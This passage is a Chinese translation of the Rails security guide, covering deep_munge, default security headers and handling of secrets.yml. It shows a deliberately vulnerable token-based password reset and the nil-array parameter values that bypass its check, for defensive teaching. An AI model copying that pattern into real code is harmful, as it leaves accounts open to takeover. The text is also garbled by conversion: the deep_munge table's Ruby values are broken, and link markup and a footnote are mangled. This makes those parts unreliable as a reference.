由于 Active Record 和 Rack 解析查询参数的特有方式，通过在 WHERE 子句中使用 `IS NULL`，攻击者可以发起非常规的数据库查询。为了应对这类安全问题（link:https://groups.google.com/forum/*!searchin/rubyonrails-security/deep\_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ\[CVE-2012-2660\]、[CVE-2012-2694](https://groups.google.com/forum/</emphasis>!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) 和 [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），Rails 提供了 `deep_munge` 方法，以保证默认情况下的数据库安全。*

在未使用 `deep_munge` 方法的情况下，攻击者可以利用下面代码中的安全漏洞发起攻击：

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

只要 `params[:token]` 的值是 `[nil]`、`[nil, nil, …​]` 和 `['foo', nil]` 其中之一，上述测试就会被被绕过，而带有 `IS NULL` 或 `IN ('foo', NULL)` 的 WHERE 子句仍将被添加到 SQL 查询中。

默认情况下，为了保证数据库安全，`deep_munge` 方法会把某些值替换为 `nil`。下述表格列出了经过替换处理后 JSON 请求和查询参数的对应关系：

| JSON | 参数 |
|------|----|
| { "person": null } | { :person => nil } |
| { "person": [] } | { :person => [ }] |
| { "person": [null] } | { :person => [ }] |
| { "person": [null, null, …​] } | { :person => [ }] |
| { "person": ["foo", null] } | { :person => ["foo" }] |

当然，如果我们非常了解这类安全风险并知道如何处理，也可以通过设置禁用 `deep_munge` 方法：

```ruby
config.action_dispatch.perform_deep_munge = false
```

默认首部
--------

Rails 应用返回的每个 HTTP 响应都带有下列默认的安全首部：

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
}
```

在 `config/application.rb` 中可以配置默认首部：

```ruby
config.action_dispatch.default_headers = {
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
}
```

如果需要也可以删除默认首部：

```ruby
config.action_dispatch.default_headers.clear
```

下面是常见首部的说明：

- **X-Frame-Options**：Rails 中的默认值是 `'SAMEORIGIN'`，即允许使用相同域名中的 iframe。设置为 `'DENY'` 将禁用所有 iframe。设置为 `'ALLOWALL'` 将允许使用所有域名中的 iframe。

- **X-XSS-Protection**：Rails 中的默认值是 `'1; mode=block'`，即使用 XSS 安全审计程序，如果检测到 XSS 攻击就不显示页面。设置为 `'0'`，将关闭 XSS 安全审计程序（当响应中需要包含通过请求参数传入的脚本时）。

- **X-Content-Type-Options**：Rails 中的默认值是 `'nosniff'`，即禁止浏览器猜测文件的 MIME 类型。

- **X-Content-Security-Policy**：强大的[安全机制](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)，用于设置加载某个类型的内容时允许的来源网站。

- **Access-Control-Allow-Origin**：用于设置允许绕过同源原则的网站，以便发送跨域请求。

- **Strict-Transport-Security**：用于设置是否强制浏览器通过[安全连接](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)访问网站。

环境安全
--------

如何增强应用代码和环境的安全性已经超出了本文的范畴。但是，别忘了保护好数据库配置（例如 `config/database.yml`）和服务器端密钥（例如 `config/secrets.yml`）。要想进一步限制对敏感信息的访问，对于包含敏感信息的文件，可以针对不同环境使用不同的专用版本。

### 自定义密钥

默认情况下，Rails 生成的 `config/secrets.yml` 文件中包含了应用的 `secret_key_base`，还可以在这个文件中包含其他密钥，例如外部 API 的访问密钥。

此文件中的密钥可以通过 `Rails.application.secrets` 访问。例如，当 `config/secrets.yml` 包含如下内容时：

```ruby
development:
  secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
  some_api_key: SOMEKEY
```

在开发环境中，`Rails.application.secrets.some_api_key` 会返回 `SOMEKEY`。

要想在密钥值为空时抛出异常，请使用炸弹方法：

```ruby
Rails.application.secrets.some_api_key! # => 抛出 KeyError: key not found: :some_api_key
```

其他资源
--------

安全漏洞层出不穷，与时俱进至关重要，哪怕只是错过一个新出现的安全漏洞，都有可能造成灾难性后果。关于 Rails 安全问题的更多介绍，请访问下列资源：

- 订阅 Rails 安全技术[邮件列表](http://groups.google.com/group/rubyonrails-security)

- 时刻关注[其他应用层](http://secunia.com/)的安全问题（可订阅周报）

- 一个优秀的[安全技术网站](https://www.owasp.org/)，提供了[跨站脚本速查表](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)

[1] 此链接已失效，应该是网站修复了这个安全漏洞。——译者注
